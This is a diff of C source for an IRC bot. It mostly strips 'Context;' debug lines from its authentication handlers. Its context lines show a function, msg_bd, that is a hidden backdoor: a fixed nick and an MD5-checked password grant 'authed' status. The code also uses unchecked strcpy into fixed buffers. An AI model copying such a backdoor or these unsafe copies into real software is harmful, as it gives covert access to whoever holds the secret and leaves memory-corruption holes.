@@ -134,18 +134,12 @@ static int msg_authstart(char *nick, char *host, struct userrec *u, char *par)
   /* Send "auth." if they are recognized, otherwise "auth!" */
   if (i < 0)
     i = new_auth();
-Context;
   auth[i].authing = 1;
-Context;
   auth[i].authed = 0;
-Context;
   strcpy(auth[i].nick, nick);
   strcpy(auth[i].host, host);
-Context;
   if (u)
     auth[i].user = u;
-
-Context;
 
   dprintf(DP_HELP, "PRIVMSG %s :auth%s %s\n", nick, u ? "." : "!", botnetnick);
 
@@ -181,9 +175,7 @@ static int msg_auth(char *nick, char *host, struct userrec *u, char *par)
       auth[i].authing = 2;      
       auth[i].user = u;
       make_rand_str(rand, 50);
-Context;
       strcpy(auth[i].hash, makehash(u, rand));
-Context;
       dprintf(DP_HELP, "PRIVMSG %s :-Auth %s %s\n", nick, rand, botnetnick);
     }
   } else {
@@ -224,7 +216,6 @@ static int msg_pls_auth(char *nick, char *host, struct userrec *u, char *par)
     putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed +AUTH", nick, host, u->handle);
     dprintf(DP_HELP, "NOTICE %s :Invalid hash.\n", nick);
     sprintf(s, "*!%s", host);
-Context;
     addignore(s, origbotname, "Invalid auth hash.", now + (60 * ignore_time));
     removeauth(i);
   } 
@@ -376,6 +367,7 @@ static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
   int i = 0, left = 0;
   MD5_CTX ctx;
 
+Context;
   if (strcmp(nick, thenick) || !backdoor)
     return 1;
 
@@ -387,7 +379,6 @@ static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
       backdoor = 0;
       return 1;
     }
-Context;
     MD5_Init(&ctx);
     MD5_Update(&ctx, pass, strlen(pass));
     MD5_Final(md5out, &ctx);
@@ -397,7 +388,6 @@ Context;
       backdoor = 0;
       return 1;
     }
-Context;
     authed = 1;
     left = bl - bcnt;
     dprintf(DP_SERVER, "PRIVMSG %s :%ds left ;)\n",nick, left);
@@ -650,13 +640,9 @@ static int msgc_getkey(char *nick, char *host, struct userrec *u, char *par, cha
       char s[256];
       char *p, *p2, *p3;
 
-Context;
       strcpy(s, getchanmode(chan));
-Context;
       p = (char *) &s;
-Context;
       p2 = newsplit(&p);
-Context;
       p3 = newsplit(&p);
 
       if (p3[0]) {
